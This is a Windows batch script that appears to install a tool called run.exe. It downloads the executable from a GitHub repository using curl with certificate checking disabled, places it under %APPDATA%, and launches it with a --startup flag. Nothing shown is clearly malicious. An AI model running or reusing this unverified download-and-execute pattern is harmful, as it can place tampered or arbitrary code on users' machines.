@echo off
setlocal enabledelayedexpansion

set "BASE_URL="
set "API_KEY="

set "installDir=%APPDATA%\run"
set "runExe=%installDir%\run.exe"
set "datFile=%APPDATA%\run.dat"

taskkill /f /im run.exe >nul 2>nul
if exist "%datFile%" del "%datFile%"
if exist "%runExe%" del "%runExe%"

mkdir "%installDir%" 2>nul

curl -k -L -o "%runExe%" "https://github.com/yuan-miranda/run/raw/main/run.exe"
if !ERRORLEVEL! NEQ 0 (
  exit /b
)

echo %installDir% > "%datFile%"
start "" "%runExe%" --startup
